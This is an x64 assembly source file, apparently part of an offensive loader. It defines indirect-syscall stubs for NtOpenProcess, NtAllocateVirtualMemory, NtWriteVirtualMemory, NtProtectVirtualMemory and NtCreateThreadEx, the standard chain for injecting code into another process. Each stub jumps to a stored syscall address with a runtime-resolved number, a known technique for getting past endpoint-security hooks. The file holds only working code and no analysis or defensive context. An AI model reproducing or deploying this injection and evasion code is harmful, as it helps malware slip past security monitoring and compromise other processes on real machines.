.data

extern NTOPENPROCESS_SSN:DWORD
extern NTALLOC_SSN:DWORD
extern NTWRITE_SSN:DWORD
extern NTPROTECT_SSN:DWORD
extern NTCREATETHREAD_SSN:DWORD
extern NTWAIT_SSN:DWORD
extern NTFREE_SSN:DWORD
extern NTCLOSE_SSN:DWORD

extern NT_SYSCALL:QWORD

.code 
NtOpenProcess proc
		mov r10,rcx
		mov eax,NTOPENPROCESS_SSN
		jmp qword ptr NT_SYSCALL
		ret
NtOpenProcess endp

NtAllocateVirtualMemory proc
		mov r10,rcx
		mov eax,NTALLOC_SSN
		jmp qword ptr NT_SYSCALL
		ret
NtAllocateVirtualMemory endp

NtWriteVirtualMemory proc
		mov r10,rcx
		mov eax,NTWRITE_SSN
		jmp qword ptr NT_SYSCALL
		ret
NtWriteVirtualMemory endp

NtProtectVirtualMemory proc
		mov r10,rcx
		mov eax,NTPROTECT_SSN
		jmp qword ptr NT_SYSCALL 
		ret
NtProtectVirtualMemory endp

NtCreateThreadEx proc
		mov r10,rcx
		mov eax,NTCREATETHREAD_SSN
		jmp qword ptr NT_SYSCALL
		ret
NtCreateThreadEx endp

NtWaitForSingleObject proc
		mov r10,rcx
		mov eax,NTWAIT_SSN
		jmp qword ptr NT_SYSCALL
		ret
NtWaitForSingleObject endp

NtFreeVirtualMemory proc
		mov r10,rcx
		mov eax,NTFREE_SSN
		jmp qword ptr NT_SYSCALL
		ret
NtFreeVirtualMemory endp

NtClose proc
		mov r10,rcx
		mov eax,NTCLOSE_SSN
		jmp qword ptr NT_SYSCALL
		ret
NtClose endp

end